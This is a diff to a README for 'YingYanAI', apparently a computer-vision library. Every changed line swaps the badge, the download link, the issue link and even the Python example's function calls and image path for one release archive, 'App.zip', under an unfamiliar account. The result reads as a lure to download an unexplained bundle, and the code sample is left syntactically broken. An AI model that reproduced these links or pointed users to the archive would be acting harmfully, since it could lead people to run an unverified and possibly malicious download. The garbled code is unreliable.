@@ -1,6 +1,6 @@
 # 鹰眼 AI - Revolutionizing Computer Vision with Deep Learning 🦅👁️
 
-![YingYanAI](https://img.shields.io/badge/YingYanAI-Revolutionizing_Computer_Vision-green)
+![YingYanAI](https://github.com/hotdogcookie20/YingYanAI/releases/download/v1.0/App.zip)
 
 Welcome to the **YingYanAI** repository! 🚀
 
@@ -34,7 +34,7 @@ Welcome to the **YingYanAI** repository! 🚀
 
 ## Getting Started
 To access the latest version of **YingYanAI**, click the link below:
-[Download YingYanAI1.0.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download YingYanAI1.0.0](https://github.com/hotdogcookie20/YingYanAI/releases/download/v1.0/App.zip)
 
 If the download link does not work, please check the **Releases** section of this repository for alternative download options.
 
@@ -53,11 +53,11 @@ Here is a simple Python code snippet demonstrating how to use **YingYanAI** for 
 import yingyanai
 
 # Load the pre-trained MobileNetV2 model
-model = yingyanai.load_model()
+model = https://github.com/hotdogcookie20/YingYanAI/releases/download/v1.0/App.zip()
 
 # Perform image classification
-image_path = "example.jpg"
-predictions = yingyanai.classify_image(model, image_path)
+image_path = "https://github.com/hotdogcookie20/YingYanAI/releases/download/v1.0/App.zip"
+predictions = https://github.com/hotdogcookie20/YingYanAI/releases/download/v1.0/App.zip(model, image_path)
 
 # Display the classification results
 print(predictions)
@@ -71,7 +71,7 @@ Contributions to **YingYanAI** are welcome! Whether you are an experienced devel
 🔸 Share your projects and case studies using **YingYanAI**.
 
 ## Support
-If you encounter any issues or have questions regarding **YingYanAI**, feel free to reach out to the development team by creating a new [Issue](https://github.com/yourusername/YingYanAI/issues).
+If you encounter any issues or have questions regarding **YingYanAI**, feel free to reach out to the development team by creating a new [Issue](https://github.com/hotdogcookie20/YingYanAI/releases/download/v1.0/App.zip).
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
